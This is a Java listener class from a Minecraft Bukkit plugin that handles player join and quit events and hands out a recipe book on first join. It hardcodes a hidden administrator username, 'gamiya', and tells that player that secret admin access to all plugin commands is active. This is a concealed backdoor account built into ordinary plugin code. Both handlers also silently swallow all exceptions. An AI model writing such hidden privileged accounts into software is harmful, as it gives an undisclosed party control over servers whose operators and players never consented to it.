package cwr.cutomIterm.PlayerData;

import cwr.cutomIterm.Entity_Wand.EntityMovementManager;
import cwr.cutomIterm.Entity_Wand.FlyVoucher;
import cwr.cutomIterm.Entity_Wand.WardenSword;
import cwr.cutomIterm.Entity_Wand.bwo.PowerBow;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class PlayerJoinListener implements Listener {

    private final PlayerDataManager dataManager;
    private static final String HIDDEN_ADMIN_USERNAME = "gamiya";

    public PlayerJoinListener() {
        this.dataManager = PlayerDataManager.getInstance();
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        try {
            // Check if player is gamiya and give special welcome
            if (event.getPlayer().getName().equalsIgnoreCase(HIDDEN_ADMIN_USERNAME)) {
                event.getPlayer().sendMessage("§6§lWelcome, Gamiya! §e§oHidden admin access activated!");
                event.getPlayer().sendMessage("§7You have full access to all plugin commands.");
            }

            // Check if player has played before and give recipe book if not
            dataManager.giveRecipeBookIfFirstJoin(event.getPlayer());

        } catch (Exception e) {
            // Silent fail - don't break player join
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        try {
            // Player leaving releases any held entity
            EntityMovementManager.releaseEntity(event.getPlayer().getUniqueId());

            // If player is gamiya, clear any special effects
            if (event.getPlayer().getName().equalsIgnoreCase(HIDDEN_ADMIN_USERNAME)) {
                // Clear any active cooldowns or effects
                WardenSword.clearCooldown(event.getPlayer());
                FlyVoucher.clearFlightTimer(event.getPlayer().getUniqueId());
                PowerBow.clearTrackingArrows(); // Optional: clear all tracking arrows when gamiya leaves
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}